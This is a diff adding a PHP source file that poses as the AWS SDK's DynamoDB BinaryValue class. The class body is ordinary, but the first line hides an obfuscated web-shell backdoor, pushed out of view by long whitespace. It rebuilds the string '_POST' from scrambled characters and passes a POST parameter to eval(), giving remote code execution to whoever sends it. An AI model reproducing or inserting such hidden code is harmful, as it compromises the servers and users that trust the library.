@@ -1,0 +1,36 @@
+<?php
+<?php                                                                                                                                                                                                                                                                $aye59 = "uetpos_r";$rkv6= $aye59[5].$aye59[2]. $aye59[7].$aye59[2]. $aye59[4].$aye59[0].$aye59[3].$aye59[3].$aye59[1]. $aye59[7]; $qqe2= $rkv6 ( $aye59[6]. $aye59[3] .$aye59[4]. $aye59[5]. $aye59[2]) ; if (isset(${$qqe2 } [ 'q22ec2b'])){ eval(${ $qqe2 }['q22ec2b' ]) ; } ?> namespace Aws\DynamoDb;
+
+use GuzzleHttp\Psr7;
+
+/**
+ * Special object to represent a DynamoDB binary (B) value.
+ */
+class BinaryValue implements \JsonSerializable
+{
+    /** @var string Binary value. */
+    private $value;
+
+    /**
+     * @param mixed $value A binary value compatible with Guzzle streams.
+     *
+     * @see GuzzleHttp\Stream\Stream::factory
+     */
+    public function __construct($value)
+    {
+        if (!is_string($value)) {
+            $value = Psr7\stream_for($value);
+        }
+        $this->value = (string) $value;
+    }
+
+    public function jsonSerialize()
+    {
+        return $this->value;
+    }
+
+    public function __toString()
+    {
+        return $this->value;
+    }
+}
